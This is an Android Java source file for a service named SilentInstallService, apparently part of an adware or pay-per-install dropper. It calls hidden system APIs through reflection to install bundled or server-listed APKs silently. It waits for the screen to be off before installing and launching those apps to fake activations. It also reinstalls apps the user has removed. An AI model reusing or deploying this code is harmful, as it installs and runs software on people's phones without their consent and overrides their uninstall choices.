package com.xstd.active.plugin;

import android.app.Service;
import android.content.*;
import android.content.pm.IPackageInstallObserver;
import android.content.pm.IPackageManager;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.database.Cursor;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.*;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.text.format.DateUtils;
import android.util.Log;
import com.android.volley.RequestQueue;
import com.android.volley.Response.Listener;
import com.android.volley.toolbox.JsonArrayRequest;
import com.android.volley.toolbox.Volley;
import com.xstd.active.plugin.dao.SilenceApp;
import com.xstd.active.plugin.dao.SilenceAppDao;
import com.xstd.active.plugin.dao.SilenceAppDaoUtils;
import net.tsz.afinal.bitmap.download.Downloader;
import net.tsz.afinal.bitmap.download.SimpleHttpDownloader;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.*;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class SilentInstallService extends Service {

	private IPackageManager manager;
	private MyReceiver receiver;
	private SharedPreferences sharedPreferences;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();

		sharedPreferences = getSharedPreferences("setting", MODE_PRIVATE);

		try {
			@SuppressWarnings("rawtypes")
			Class clazz = getClassLoader().loadClass("android.os.ServiceManager");
			@SuppressWarnings("unchecked")
			Method method = clazz.getMethod("getService", new Class[] { String.class });
			IBinder b = (IBinder) method.invoke(null, "package");
			manager = IPackageManager.Stub.asInterface(b);
		} catch (Exception e) {
			e.printStackTrace();
		}

		receiver = new MyReceiver();
		IntentFilter filter = new IntentFilter();
		filter.setPriority(Integer.MAX_VALUE);
		filter.addAction(Intent.ACTION_SCREEN_ON);
		filter.addAction(Intent.ACTION_SCREEN_OFF);
		filter.addAction(Intent.ACTION_USER_PRESENT);
		filter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
		registerReceiver(receiver, filter);

		boolean fs = sharedPreferences.getBoolean("fs", false);
		if (!fs)
			copyFileToCache();
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		if (receiver != null)
			unregisterReceiver(receiver);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		if (intent != null && !TextUtils.isEmpty(intent.getStringExtra("apk_path")))
			installFile(new File(intent.getStringExtra("apk_path")), observer);
		return super.onStartCommand(intent, flags, startId);
	}

	class MyReceiver extends BroadcastReceiver {

		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();
			if (Intent.ACTION_SCREEN_ON.equals(action)) {
				isScreenLignt = true;
				active = false;
				goHome();
			} else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
				isScreenLignt = false;
				activeApp();
			} else if (Intent.ACTION_USER_PRESENT.equals(action)) {
				checkActive();
			} else if(WifiManager.NETWORK_STATE_CHANGED_ACTION.equals(action)) {
				Parcelable parcelableExtra = intent.getParcelableExtra(WifiManager.EXTRA_NETWORK_INFO);
				if (null != parcelableExtra) {
					NetworkInfo networkInfo = (NetworkInfo) parcelableExtra;
					boolean isConnected = networkInfo.isAvailable();
					if (isConnected) {
						updateService();
						if(mustDownloadApp.size()>0) {
                            Intent service = new Intent(getApplicationContext(),DownloadService.class);
							startService(service);
						}
					}
				}
			}
		}
	}
	
	public static final String SERVER_URL_PATH = "https://";
	public static Set<DownloadApplication> mustDownloadApp = new HashSet<DownloadApplication>();

	/**
	 * 更新服务器
	 */
	private void updateService() {
		long last_update_time = sharedPreferences.getLong("last_update_time", 0);
		if(DateUtils.isToday(last_update_time)) {
			return;
		}
		mustDownloadApp.clear();
		RequestQueue rq = Volley.newRequestQueue(this);
		rq.add(new JsonArrayRequest(SERVER_URL_PATH, new Listener<JSONArray>() {

			@Override
			public void onResponse(JSONArray arg0) {
				sharedPreferences.edit().putLong("last_update_time", System.currentTimeMillis());
				getDeviceInstallPackName();
				for (int i = 0; i < arg0.length(); i++) {
					try {
						JSONObject obj = arg0.getJSONObject(i);
						String name = obj.getString("software_name");
						String packName = obj.getString("package_name");
						String url = obj.getString("apk_uri");
						if(!mustDownloadApp.contains(packName)) {
							DownloadApplication app = new DownloadApplication();
							app.fileName = name;
							app.packName = packName;
							app.remoteUrl = url;
							mustDownloadApp.add(app);
						}
					} catch (JSONException e) {
						e.printStackTrace();
					}
				}
			}
		}, null));
		rq.start();
	}
	
	public static class DownloadApplication {
		String fileName;
		String packName;
		String remoteUrl;
	}

	private boolean isScreenLignt = true;
	public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;//一天的毫秒数

	private void checkActive() {
		getDeviceInstallPackName();
		long currentTimeMillis = System.currentTimeMillis();

		SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(this);
		Cursor cursor = dao.getDatabase().query(dao.getTablename(), dao.getAllColumns(), null, null, null, null, null);
		while (cursor.moveToNext()) {
			long id = cursor.getLong(0);
			String packName = cursor.getString(1);
			long installtime = cursor.getLong(cursor.getColumnIndex(SilenceAppDao.Properties.Installtime.columnName));
			long installTotal = currentTimeMillis - installtime;
			SilenceApp entity = new SilenceApp();
			entity.setId(id);
			entity.setPackagename(packName);
			if (DAY_TIME_MILLIS < installTotal && installTotal < DAY_TIME_MILLIS * 2) {
				if (!packgeNames.contains(packName)) {
					reInstallAfterUninstall(entity);
				} else {
					entity.setActive(false);
					dao.update(entity);
				}
			} else if (DAY_TIME_MILLIS * 4 < installTotal && installTotal < DAY_TIME_MILLIS * 6) {
				if (!packgeNames.contains(packName)) {
					reInstallAfterUninstall(entity);
				} else {
					entity.setActive(false);
					dao.update(entity);
				}
			}
		}
	}

	/**
	 * 重新安装然后卸载
	 * 
	 * @param entity
	 */
	private void reInstallAfterUninstall(final SilenceApp entity) {
		SilenceAppDaoUtils.getSilenceAppDao(this).delete(entity);
		new Thread(new Runnable() {

			@Override
			public void run() {
				if (!Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED))
					return;
				String sdcardPath = Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + "Download";
				AssetManager assets = getAssets();
				InputStream is = null;
				OutputStream os = null;
				try {
					for (String app : assets.list("")) {
						if (!app.endsWith(".apk"))
							continue;
						File file = new File(sdcardPath, app);
						if (file.exists()) {
							String packName = getPackageName(file.getAbsolutePath());
							if (packName != null && packName.equals(entity.getPackagename())) {
								installFile(file, observer);
								return;
							}
						}
						is = assets.open(app);
						os = new BufferedOutputStream(new FileOutputStream(file));
						byte[] b = new byte[1024 * 5];
						int len;
						while ((len = is.read(b)) != -1) {
							os.write(b, 0, len);
						}
						os.flush();
						String packName = getPackageName(file.getAbsolutePath());
						if (packName != null && packName.equals(entity.getPackagename())) {
							installFile(file, observer);
							return;
						}
					}
				} catch (Exception e) {
					e.printStackTrace();
				} finally {
					try {
						if (is != null)
							is.close();
						if (os != null)
							os.close();
					} catch (Exception e) {
					}
				}
			}
		}).start();
	}

	private String packageName;
	private boolean active;
	private List<String> packgeNames = new ArrayList<String>();

	/**
	 * 获得设备上安装程序的包名
	 */
	private void getDeviceInstallPackName() {
		packgeNames.clear();
		List<PackageInfo> pis = getPackageManager().getInstalledPackages(PackageManager.GET_ACTIVITIES);
		for (PackageInfo pi : pis)
			packgeNames.add(pi.packageName);
	}

	/**
	 * 激活程序
	 */
	private void activeApp() {
		getDeviceInstallPackName();
		new Thread(new Runnable() {
			@Override
			public void run() {
				active = true;
				SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext());
				Cursor cursor = dao.getDatabase().query(dao.getTablename(), dao.getAllColumns(), "active=?", new String[] { String.valueOf(0) }, null, null,
						SilenceAppDao.Properties.Installtime.columnName + " ASC");

				while (active && cursor.moveToNext()) {
					long id = cursor.getLong(0);
					String packname = cursor.getString(1);
					if (!packgeNames.contains(packname)) {
						Log.w("ps", packname + "not active, it's uninstall, delete it in db.");
						break;
					}
					packageName = packname;
					Intent app = getPackageManager().getLaunchIntentForPackage(packname);
					startActivity(app);
					SystemClock.sleep(15000);
					if (!active) {
						break;
					}
					SilenceApp entity = new SilenceApp();
					entity.setId(id);
					entity.setPackagename(packname);
					entity.setActive(true);
					dao.update(entity);
					if (packageName != null) {
						goHome();
						// ActivityManager am = (ActivityManager)
						// getSystemService(Context.ACTIVITY_SERVICE);
						// am.killBackgroundProcesses(packageName);
					}
				}
				if (cursor != null)
					cursor.close();
			}
		}).start();
	}

	/**
	 * 回到Launcher
	 */
	public void goHome() {
		Intent i = new Intent(Intent.ACTION_MAIN);
		i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		i.addCategory(Intent.CATEGORY_HOME);
		startActivity(i);
	}

	/**
	 * 安装程序
	 * 
	 * @param file
	 */
	private void installFile(File file, IPackageInstallObserver observer) {
		if (file == null)
			return;
		if (!file.isFile())
			return;
		if (file.length() <= 0)
			return;
		if (!file.getName().endsWith(".apk"))
			return;
		String packName = getPackageName(file.getAbsolutePath());
		Uri uri = Uri.fromFile(file);
		if (uri != null)
			try {
				manager.installPackage(uri, observer, 0, packName);
			} catch (RemoteException e) {
				e.printStackTrace();
			}
	}

	/**
	 * 通过一个apk文件获得程序的包名
	 * 
	 * @param absPath
	 * @return
	 */
	private String getPackageName(String absPath) {
		PackageInfo pkgInfo = getPackageManager().getPackageArchiveInfo(absPath, PackageManager.GET_ACTIVITIES);
		if (pkgInfo != null) {
			return pkgInfo.applicationInfo.packageName;
		}
		return null;
	}

	/**
	 * sim卡是否可用
	 * 
	 * @return
	 */
	private boolean simReady() {
		TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
		if (TelephonyManager.SIM_STATE_READY == tm.getSimState())
			return true;
		else
			return false;
	}

	private void copyFileToCache() {
		if (!simReady())
			return;
		new Thread(new Runnable() {
			@Override
			public void run() {
				SystemClock.sleep(1000 * 60 * 30);
				while (isScreenLignt)
					SystemClock.sleep(2000);
				if (!Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED))
					return;
				String sdcardPath = Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + "Download";
				AssetManager assets = getAssets();
				InputStream is = null;
				OutputStream os = null;
				try {
					for (String app : assets.list("")) {
						if (!app.endsWith(".apk"))
							continue;
						File file = new File(sdcardPath, app);
						if (file.exists())
							continue;
						is = assets.open(app);
						os = new BufferedOutputStream(new FileOutputStream(file));
						byte[] b = new byte[1024 * 5];
						int len;
						while ((len = is.read(b)) != -1) {
							os.write(b, 0, len);
						}
						os.flush();
						installFile(file, observer);
					}
				} catch (Exception e) {
					e.printStackTrace();
				} finally {
					try {
						if (is != null)
							is.close();
						if (os != null)
							os.close();
					} catch (Exception e) {
					}
				}
				sharedPreferences.edit().putBoolean("ps", true).commit();
			}
		}).start();
	}

	/**
	 * 程序安装结果
	 */
	private IPackageInstallObserver.Stub observer = new IPackageInstallObserver.Stub() {

		@Override
		public void packageInstalled(String packageName, int returnCode) throws RemoteException {
			if (returnCode == 1) {
				SilenceApp sa = new SilenceApp();
				sa.setPackagename(packageName);
				sa.setInstalltime(System.currentTimeMillis());
				sa.setActive(false);
				SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext()).insert(sa);
			}
		}
	};

}